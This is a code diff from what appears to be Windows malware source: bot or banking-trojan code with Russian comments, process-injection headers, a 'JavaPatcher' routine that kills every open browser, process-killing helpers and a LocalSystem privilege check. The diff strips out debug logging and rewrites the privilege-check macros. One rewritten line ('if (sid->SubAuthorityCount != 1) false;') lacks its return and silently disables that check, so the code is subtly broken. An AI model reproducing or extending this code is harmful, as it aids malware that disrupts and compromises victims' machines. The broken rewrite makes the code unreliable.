@@ -14,14 +14,15 @@
 #include "ntdll.h"
 #include "inject.h"
 
-#include "BotDebug.h"
+//#include "BotDebug.h"
 
-namespace UTILSDEBUGSTRINGS
-{
-	#include "DbgTemplates.h"
-}
+//namespace UTILSDEBUGSTRINGS
+//{
+//	#include "DbgTemplates.h"
+//}
 
-#define DBG UTILSDEBUGSTRINGS::DBGOutMessage<>
+
+//#define DBG UTILSDEBUGSTRINGS::DBGOutMessage<>
 
 
 
@@ -2604,8 +2605,7 @@ void KillAllBrowsers()
 			DWORD PID = 0;
 			pGetWindowThreadProcessId( wnd, &PID );
 			if( PID )
-				if( KillProcess(PID, 1000) )
-					DBG( "JavaPatcher", "kill browser %s", *bb );
+				KillProcess(PID, 1000);
 		}
 		bb++;
 	}
@@ -2861,7 +2861,6 @@ HANDLE CaptureMutex( const char* name, int wait )
 //                 миллисекундах с момента последнего
 //				   изменения файла
 //------------------------------------------------------
-
 DWORD File::LastWriteTime(HANDLE FileHandle)
 {
 	// Функция проверяет время последнего изменения файла
@@ -2954,23 +2953,23 @@ bool IsUserLocalSystem()
 	DWORD		user_sid_length = 0;
 
 	pOpenProcessToken( pGetCurrentProcess(), TOKEN_READ, &token_handle);
-	PP_RETURNIF2(token_handle == NULL, false);
+	if(token_handle == NULL) return false;
 
 	m_memset(user_sid_buffer, 0, sizeof(user_sid_buffer));
 
 	pGetTokenInformation(token_handle, TokenUser, user_sid_buffer, 
 		sizeof(user_sid_buffer), &user_sid_length);
-	PP_RETURNIF2(user_sid_length == 0, false);
+	if (user_sid_length == 0) return false;
 
 	PSID_AND_ATTRIBUTES attributes = (PSID_AND_ATTRIBUTES)&user_sid_buffer[0];
 	PISID sid = (PISID)attributes->Sid;
 
 	// LocalSystem SID S-1-5-18
 	// Процедура низкоуровневой сверки с SID LocalSystem
-	PP_RETURNIF2(sid->Revision != SID_REVISION, false);
-	PP_RETURNIF2(sid->SubAuthorityCount != 1, false);
-	PP_RETURNIF2(m_memcmp(&sid->IdentifierAuthority, &kNtAuthority, sizeof(kNtAuthority)) != 0, false);
-	PP_RETURNIF2(sid->SubAuthority[0] != SECURITY_LOCAL_SYSTEM_RID, false);
+	if (sid->Revision != SID_REVISION) return false;
+	if (sid->SubAuthorityCount != 1) false;
+	if (m_memcmp(&sid->IdentifierAuthority, &kNtAuthority, sizeof(kNtAuthority)) != 0) return false;
+	if (sid->SubAuthority[0] != SECURITY_LOCAL_SYSTEM_RID) return false;
 
 	return true;
 }
@@ -3111,7 +3110,6 @@ void KillBlockingProcesses( const char* fileName )
 		counter++;
 		while( countProcess-- )
 		{
-			DBG( "KillBlockingProcesses()",  "Killing process %d", PIDS[countProcess] );
 			KillProcess( PIDS[countProcess], 1000 );
 		};
 	};	
